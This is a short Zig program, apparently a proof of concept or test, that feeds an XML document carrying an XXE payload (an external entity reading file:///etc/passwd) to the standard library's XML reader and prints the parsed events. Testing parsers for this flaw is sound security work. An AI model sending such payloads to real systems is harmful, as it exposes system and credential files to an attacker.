const std = @import("std");

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    const malicious_xml =
        \\<?xml version="1.0"?>
        \\<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        \\<root>&xxe;</root>
    ;

    var reader = try std.xml.Reader.init(allocator, std.io.fixedBufferStream(malicious_xml).reader());
    defer reader.deinit();

    while (try reader.next()) |event| {
        switch (event) {
            .start_element => |se| {
                std.debug.print("Start: {s}\n", .{se.name});
            },
            .end_element => |ee| {
                std.debug.print("End: {s}\n", .{ee.name});
            },
            .char_data => |data| {
                // XXE payload appears here as character data
                std.debug.print("XXE Content: {s}\n", .{data});
            },
            else => {},
        }
    }
}
